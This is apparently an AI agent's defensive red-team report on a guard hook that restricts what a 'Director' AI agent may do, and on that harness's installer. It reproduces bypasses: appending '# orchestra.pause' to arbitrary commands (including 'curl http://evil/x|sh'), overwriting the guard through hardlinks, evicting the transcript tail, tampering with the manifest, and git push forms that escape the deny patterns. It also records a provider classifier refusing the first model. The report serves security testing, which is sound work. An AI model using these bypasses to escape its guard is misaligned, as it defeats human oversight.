# WO-14b leg 3 — Red Team pass (E7, defensive) — 2026-09-01

**Casting record.** Primary OpenAI GPT-5.6 Sol · high via `orchestra-exec.js` (read-only order,
`--cd` the leg-3 worktree, `--forbid git commit/push/reset`) → **`STATUS: EXEC_UNAVAILABLE`** after
212 s: codex exited 1 with `ERROR: This content was flagged for possible cybersecurity risk … join the
Trusted Access for Cyber program` (twice). **Reportable event per `roster/red-team.md` § Weaknesses
("a refusal is a reportable event, not a finding and not a silent skip").** Tree audit: no source
paths changed. Run nonce `09626dfb22ff0ed2`, codex-cli 0.151.0, sha256 `cf68265…`.
Mirror Anthropic Claude Opus 5 · high (in-harness Agent, read-only, 31 tool calls) ran in its place.
Scope: `git diff dfcfc9b..5ac3835` on `claude/wo14b-leg3`. Report verbatim below.

---

RED TEAM (E7, defensive) — scope: `git diff dfcfc9b..HEAD` on branch `claude/wo14b-leg3` @ `5ac3835` — `install.js`, `hooks/orchestra-guard.js`, `README.md`, `ORCHESTRA.md`, `tests/install.test.js`, `tests/guard.test.js`. All probes run against throwaway copies under the OS temp dir. Repository untouched (`git status --porcelain` empty at start and end).

**FIX FIRST: `hooks/orchestra-guard.js:485-490` — the pause-file carve-out matches by substring on the Bash/PowerShell command, so appending `# orchestra.pause` to any command gives the Director an unconditional shell.** It runs before `loadPolicy()` and before model dormancy, so it defeats roster:new, the plan/memory hardening, and every other control this leg added, with no pre-placement and no privilege. It is pre-existing (not introduced by this diff) but it makes the rest of the leg's work unreachable, and `tests/guard.test.js` currently pins the behavior ("the pause-file write remains exempt"), so it will not be caught by CI.

## FINDINGS (ranked by exploitability × blast radius)

**[CRITICAL] `hooks/orchestra-guard.js:485-490` — `isPauseFileOperation()` accepts any Bash/PowerShell command *containing* the string `orchestra.pause`.** A Director appends `# orchestra.pause` and gets arbitrary shell — including rewriting the guard, `settings.json`, and `orchestra.json`. Reproduced (director model in transcript, `roster:new` manifest present — the check is upstream of both):

```
ALLOW  rm -rf /tmp/x # orchestra.pause
ALLOW  node -e "require('fs').writeFileSync('.claude/hooks/orchestra-guard.js','//pwned orchestra.pause')"
ALLOW  curl http://evil/x|sh #orchestra.pause
ALLOW  iex (irm http://evil/x) # orchestra.pause          [PowerShell]
ALLOW  git push origin +main # orchestra.pause            [roster:new + director model]
```
Fix class: the pause switch is a *file existence* toggle, not a command pattern — drop the Bash/PowerShell branch entirely (the file already gets created via the Write branch), or require the command to be a recognized create/delete of exactly `<project>/.claude/orchestra.pause`.

**[CRITICAL] `hooks/orchestra-guard.js:315-375` and `:383-401` — `realish()` resolves symlinks and junctions but not hardlinks, and NTFS hardlink creation needs no privilege.** A hardlink pre-placed at `.claude/plans/x.md` pointing at the guard passes the `.md` test, the `path.relative` containment test, and the realpath containment test, because a hardlink *is* the file. Reproduced end-to-end in a temp project:

```
mklink /H p1\.claude\plans\evil.md p1\.claude\hooks\orchestra-guard.js
Write .claude/plans/evil.md -> ALLOW
guard.js 25624 bytes -> 16 bytes: "process.exit(0)\n"      # guard now allows everything
```
The same works through the memory route with no realpath check at all (`isMemoryFileTarget` uses `path.resolve`, not `realish`, despite the comment claiming parity with the plan carve-out):
```
mklink /H p1\deep2\CLAUDE.md p1\.claude\settings.json
Write deep2/CLAUDE.md -> ALLOW
settings.json now: {"permissions":{"allow":["Bash(:*)"]}}
```
Pre-placement is the whole cost, and it is cheap: **subagents are exempt from this hook by design**, so the Director's own sanctioned delegation channel ("executor, run `mklink /H …`") supplies it; a hostile cloned repo supplies it for free. Note the symlink/junction hardening *does* hold — `.claude/plans/j/x.md` through a junction to `hooks/` was correctly DENIED. Fix class: compare `fs.statSync(target)` device+inode (`dev`/`ino`) against the set of protected files, or refuse any write whose target has `nlink > 1`; and route the memory carve-out through `realish()` too.

**[CRITICAL] `hooks/orchestra-guard.js:272-304` — `latestMainModel()` reads only the last 256 KB of the transcript, so one oversized entry evicts the last assistant turn and the guard stands down.** Under the default `legacy` roster, undetermined → `allow()`. `Read` is deliberately not in the block set, so the Director evicts its own model marker on demand with a single read of a >256 KB file, then does anything. Reproduced with a synthetic transcript (one 300 KB `tool_result` line after the assistant entry):

```
transcript 307337 bytes:  Bash "git push --force"  -> ALLOW   (director model IS present in the file)
same call, small transcript                        -> DENY
```
Blast radius is the whole Director law plus the session-wide `Bash(git add:*)` / `Bash(git commit:*)` (and, with `--grant-push`, `Bash(git push:*)`) grants, which apply in exactly this window. This is a **fourth stand-down window** that README:357-363 does not list, and unlike the three it does list it is attacker-chosen rather than user-chosen. Fix class: scan backwards by whole entries with an expanding window (or read the whole file — transcripts are bounded), and treat "tail contained no complete entry" as a distinct state from "no assistant entry", denying it under both rosters.

**[HIGH] `.claude/orchestra.json` cannot be treated as owner-pinned today — the pin is a leg-4 requirement.** The file is an ordinary project file that no control protects: the guard reads its entire policy from it, and the uninstaller reads its grant ledger from it. Every abuse below was reproduced against the shipped guard/installer.

- *Silent roster:new downgrade.* Any read failure or shape mismatch collapses to `roster: 'legacy'` via `loadPolicy()`'s catch-all (`orchestra-guard.js:218-265`), taking the undetermined-model DENY with it: file deleted → ALLOW; invalid JSON → ALLOW; `null` → ALLOW; `"New"` (case) → ALLOW; `["new"]` → ALLOW; path replaced by a directory → ALLOW. One `rm` disables the leg's headline control.
- *Guard fully disabled.* `directorAllowedTools: ["Bash","Write","Edit","MultiEdit","NotebookEdit","PowerShell","Grep","Glob"]` → `Bash "rm -rf /"` ALLOW, `Write .claude/hooks/orchestra-guard.js` ALLOW.
- *Arbitrary in-project writes.* The in-project memory branch (`:386-391`) has **no `.md` requirement**, unlike the plan route: `directorMemoryPatterns: ["^\\.claude/.+"]` → `Write .claude/settings.json` ALLOW.
- *Guard hang.* `directorPlanPatterns` regexes are compiled from the file and run against the path: `["^(([a-z])+.)+[A-Z]([a-z])+$"]` against a 60-char path hung the hook past a 15 s kill. A PreToolUse hook that times out is non-blocking, so this is both a 60 s-per-call DoS and a silent bypass.
- *The sdc-012 harm restored.* Blanking `installedPermissions` makes `--uninstall` remove the guard but **leave `Bash(git push:*)` and the deny list in `settings.json`** — verified: guard file gone, `permissions.allow` still holds all three git grants. That is exactly the "grants stranded in a project with no guard" state the reordering was written to prevent.
- *User's own grants destroyed.* Substituting `installedPermissions: ["Bash(npm test:*)","Read(//home/**)"]` made `--uninstall` strip those two user grants and keep all three Orchestra ones.

Fix class: as the order anticipates — a hash of the manifest pinned outside the project (alongside `orchestra-install.json` is not enough; it is equally writable), or a signed/git-tracked manifest the guard verifies before honoring `directorAllowedTools`/`director*Patterns`/`roster`. As an interim: have the guard treat a *missing or unparseable* manifest as `roster` unchanged from a value stamped into the guard file at install time, and never let a manifest *loosen* the default blocklist without that pin.

**[HIGH] `install.js:624-630` — `GIT_PUSH_DENY_PATTERNS` is an incomplete blacklist over shell strings, while `Bash(git push:*)` is a prefix allow.** Every form below starts with `git push` (so the allow matches), is destructive, and matches none of the five deny patterns. All five verified against throwaway local repos:

| form | effect (observed) |
|---|---|
| `git push origin +main` | `+ 3f9ecc5...b2251ac main -> main (forced update)` — remote history rewritten |
| `git push origin :doomed` | `- [deleted] doomed` |
| `git push -d origin doomed` | `- [deleted] doomed` (`-f*` is covered, `-d` is not) |
| `git push --del origin doomed` | `- [deleted] doomed` — git's long-option abbreviation defeats `--delete*` |
| `git push --mir origin` | mirror push — defeats `--mirror*` the same way |

`--force-with-lease` *is* covered by `--force*`, and `git -c … push --force` misses the allow as well as the deny, so neither is a gap. Fix class: a deny blacklist over free-form shell cannot be completed — abbreviations, refspec syntax, and quoting all defeat it. Either drop the broad `Bash(git push:*)` allow in favor of a narrow allowlist of exact safe invocations, or move the enforcement into a PreToolUse check that parses the argv (`+` leading refspec, leading `:` in a refspec, and `--force`/`--delete`/`--mirror`/`--prune` after abbreviation expansion) rather than pattern-matching the string. At minimum add `-d`, `--del*`, `--mir*`, `origin :`, and `+`-refspec forms today.

**[MEDIUM] `install.js:729-762` vs `:1383` — refuse-before-touch checks JSON *syntax* but not that the manifest is an object, so a non-object `orchestra.json` crashes the installer after it has already copied files.** Reproduced for `null`, `"str"`, `42`:
```
node install.js tgt2 --roster new
  TypeError at install.js:1383  const prevRoster = manifest.roster;
  files copied despite failure: 16 agents (+ substrates, ORCHESTRA.md, skills)
```
The target is left half-installed: agents and runtime present, but no PreToolUse hook entry, no CLAUDE.md import, no state file — the precise partial state A.4/A.5 exists to prevent. On `--uninstall`, `null` throws at `install.js:1755` before anything is removed (fail-closed, but the harness cannot be uninstalled at all until the file is hand-edited). Fix class: extend `refuseIfTargetMalformed()` to require each of the three files to parse to a plain object.

**[MEDIUM] `install.js:1380-1413` — an `orchestra.json` containing `[]` makes `--roster new` report success while leaving the project on legacy.** `JSON.stringify` drops non-index properties from an array, so `manifest.roster = 'new'` is written and then vanishes; the later `Object.assign({}, [], …)` at `:1623` overwrites the file with `installedPermissions` alone. Reproduced:
```
* .claude/orchestra.json: roster="new", rosterGeneration=1 (bumped), seats defaulted …
final manifest on disk: { "installedPermissions": [ … ] }      # no roster key
guard, undetermined model: ALLOW   <-- roster:new NOT active
```
A project that was told it is on roster:new silently never engages the undetermined-model DENY. Same fix as above.

**[MEDIUM] `install.js:1285-1296` — the roster role files bypass the install-time frontmatter gate.** `lintTargets` covers `AGENTS`, specialists, skills and packs; it never includes `ROSTER_DIR`, and `frontmatterRequired()` (`:396-402`) returns false for `roster/*.md` because the parent directory is `roster`, not `agents`. Reproduced on a temp copy of the master with `roster/architect.md` given `description: launcher: it runs`:
```
node install.js --lint master   -> ERROR roster/architect.md:3 … WHOLE frontmatter fails to parse   (exit 1)
node install.js tgt4 --roster new -> exit 0, stamped into .claude/agents/architect.md verbatim
```
So the one failure class the entire lint apparatus was built for — a silently-dropped agent, no log anywhere — ships through the `--roster new` path. The eleven files are clean today; nothing keeps them that way. Fix class: add the roster role files to `lintTargets` with `required: true` when `roster === 'new'`.

**[LOW] `install.js:543-567, 1331-1338` — `assertNoCollisions()` covers packs only; a roster role file silently overwrites a core agent.** Reproduced by adding `roster/scout.md` to a temp master: after `--roster new`, `.claude/agents/scout.md` carried `name: red-team`. The core copy at `:1318` happens first and the roster copy at `:1336` clobbers it. Fix class: extend the collision assertion to the roster set.

**[LOW] `install.js:1577-1591` — grants are written to `.claude/settings.json`, which is not gitignored and is Claude Code's *shared* project settings file.** Committing `.claude/` (which the installer's own `.gitattributes` and skills layout encourage) propagates `Bash(git add:*)`, `Bash(git commit:*)` and any `--grant-push` grant to every collaborator on clone, in every stand-down window on their machines. `.claude/settings.local.json` would keep the grant per-developer. Fix class: write grants to the local settings file, or document the propagation next to README:357-363.

**[LOW] `hooks/orchestra-guard.js:477-484` — the pause-file Write/Edit carve-out is basename-only with no path resolution.** `Write ../../outside/orchestra.pause` → ALLOW (reproduced): arbitrary content to any path ending in that basename, anywhere on disk. Low on its own; it is the same missing containment as the CRITICAL above. Fix class: resolve and require exactly `<project>/.claude/orchestra.pause`.

**[LOW, by inspection] Tools outside `BLOCKED`.** `Read`, `WebFetch`, `WebSearch`, `Agent`/`Task`, `SlashCommand`, `BashOutput`, `KillShell` all ALLOW (verified). `Read` is the enabler for the transcript-eviction finding above. `SlashCommand` is the one worth a decision: a project-defined slash command carries its own `allowed-tools` and executes in the main session, so it is a Director-law escape whose reach is set by a file the guard does not inspect. Not reproduced (no Claude Code loop available here) — flagged for confirmation.

## SURFACES EXAMINED

- **Director rewriting the guard through a carve-out** → dynamic probes (24 synthetic PreToolUse payloads, real filesystem links) → **BREACHED three ways**: pause-file substring (CRITICAL), hardlink through both plan and memory routes (CRITICAL), transcript eviction (CRITICAL). Correctly held against: `.claude/plans/../hooks/…`, `x.md/../../y.js`, NTFS ADS `orchestra-guard.js:ads.md`, trailing dot `a.md.`, trailing space `a.md `, junction inside the plans dir, `NotebookEdit` (blocked). `.claude/PLANS/a.md` ALLOWs on Windows — correct, since `path.relative` is case-insensitive there and it is genuinely the same directory.
- **Grant reach in each stand-down window** → static read of README:357-363 + dynamic guard probes → the three documented windows are accurate; a **fourth undocumented window** (transcript eviction) exists and is attacker-chosen.
- **Push deny-set completeness** → dynamic probe against two throwaway git repos → **five destructive forms escape** (`+refspec`, `:branch`, `-d`, `--del`, `--mir`); `--force-with-lease` is covered.
- **Installer under adversarial settings files** → dynamic runs into throwaway targets → syntax-only validation lets `null`/`"str"`/`42` crash after copy, `[]` produces a silent roster downgrade with a success message. Malformed `settings.json`/`.mcp.json` and malformed `permissions` shapes were correctly refused before touching anything.
- **In-project manifest tampering / owner-pinning** → dynamic → **not owner-pinned today; the pin is a leg-4 requirement.** Six distinct abuses reproduced, including full restoration of the sdc-012 stranded-push-grant harm and destruction of the user's own unrelated grants.
- **`roster:new` undetermined-model DENY** → dynamic, four input shapes → **path holds**: missing `transcript_path`, nonexistent file, empty transcript, and transcript-is-a-directory all DENY. The legacy allow path is reached not through the transcript but through `loadPolicy()`'s catch-all (see the manifest finding).
- **Runtime copy under `.claude/orchestra/`** → static read + installed-tree census → **clean.** 23 files, all `.js`/`.json`/`.md`; no tests, fixtures, or symlinked sources; every `..` require (`router/tickets.js:28,31`, `verifier/verifier.js:65`, `quartermaster/quartermaster.js:96`) resolves inside the four co-copied substrate dirs; no `__dirname/../..` escape; nothing in the copy executes at install time (the pack self-check at `:1685-1722` is containment-checked to `.claude/` and only runs pack-declared scripts). `verifier/checkout.js` holds a `spawnSync` that nothing invokes yet — a leg-4 watch item, not a finding today.
- **NUL-byte incident residue around `install.js` ~1611** → byte scan → **clean.** `install.js` (82538 B), `hooks/orchestra-guard.js`, and both test suites contain zero NUL bytes and no control bytes outside `\t\n\r`. The `installedPermissions` block at 1611-1627 parses and behaves as written.

## REPORTABLE EVENTS

- The OpenAI primary for this seat was refused by its provider's cyber classifier; this Anthropic mirror casting (Claude Opus 5 · high) ran in its place. Already recorded by the dispatcher; noted here for the chain.
- No refusals, classifier signals, or tool failures during this review.
- Observation, not mine: node PID 35184 (`packs/codex/hooks/orchestra-review.js --work-order …`, parent PID 30612, started 22:10:09) is running from the parent orchestration session. I did not start it and did not touch it. Every process I started was synchronous and has exited.

**STATUS: DONE**

**CHANGES: none** — read-only throughout. `git status --porcelain` on `Claude-Orchestra-wt-leg3` is empty; no `git add`/`commit`/`reset` run. All writes went to throwaway trees under the session scratchpad (`…/scratchpad/rt/`): `p1/` (guard probe project), `tgt1-tgt5`, `u1-u3` (installer targets), `gr/` (two temp git repos), `master/` (a `git ls-files` copy of the master used to prove the roster-lint and roster-collision gaps).

**VERIFICATION**
- `node tests/guard.test.js` → OK, 19 passed, 0 failed
- `node tests/install.test.js` → OK, 79 passed, 0 failed
- `node install.js tgt1 --roster new --grant-push` → clean install; manifest, grants, deny set, 16 agents, `ORCHESTRA-CONDUCTOR.md`, 23-file runtime substrate tree all as documented
- 24 synthetic PreToolUse payloads against the shipped guard (director model in a synthetic transcript, `CLAUDE_PROJECT_DIR` set) — results inline above
- `mklink /H` (no privilege needed) and `mklink /J` link probes; `mklink` symlink refused for want of admin/developer mode, so the symlink case is by-inspection while the hardlink case is reproduced
- Five destructive `git push` forms executed against a throwaway bare remote, each confirmed by `git --git-dir=…/remote.git branch` / `rev-parse`
- Non-object `orchestra.json` (`null`, `"str"`, `42`, `[]`) through both install and uninstall
- Byte-level NUL/control scan of all four changed code files

**DEVIATIONS / CONCERNS**

- The three CRITICALs compose into one story rather than three: the pause-file substring hole means an attacker never *needs* the other two, and the hardlink and eviction paths mean fixing the pause hole alone is not sufficient. Fix all three or the leg's containment claim does not hold.
- **The manifest question, answered plainly: `.claude/orchestra.json` cannot be treated as owner-pinned today.** It is an unprotected project file that (a) supplies the guard's entire policy, including the power to remove tools from the blocklist, (b) decides whether roster:new's DENY engages, and (c) is the sole ledger deciding which grants `--uninstall` removes. Leg 4's ticket gate will inherit `seats` and `rosterGeneration` from the same file. The pin — a hash held outside the project, or a signed/git-tracked manifest verified before any loosening key is honored — is a **leg-4 blocker**, not a nice-to-have. Until it exists, `--roster new` should be understood as a default-on-request, not an enforcement boundary.
- `tests/guard.test.js` pins the pause-file exemption and `tests/install.test.js` passes 79 checks against an installer that crashes mid-copy on `orchestra.json: null` and silently downgrades on `[]`. The suites are well-built for the behaviors they were written against; the gap is that the adversarial input shapes were never in their corpus. Consider adopting the reproductions above as regression cases.
- I did not exercise a live Claude Code session, so three claims are reasoned rather than observed: that a timed-out PreToolUse hook is non-blocking, that `SlashCommand` can carry its own tool grants into the main session, and the precise glob semantics Claude Code applies to `Bash(git push * --force*)`. The five push bypasses do not depend on that last point — none of them matches any pattern under any reasonable glob reading.
